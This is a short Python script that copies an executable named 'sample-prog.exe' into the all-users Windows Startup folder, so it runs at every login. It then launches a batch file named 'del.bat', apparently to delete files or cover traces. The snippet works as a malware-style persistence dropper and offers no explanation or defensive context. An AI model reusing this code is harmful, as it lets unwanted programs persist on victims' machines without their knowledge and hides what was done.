import os
from shutil import copy


path = os.getcwd()

copy(path+'\sample-prog.exe', 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp')

os.startfile(path + r"\del.bat")
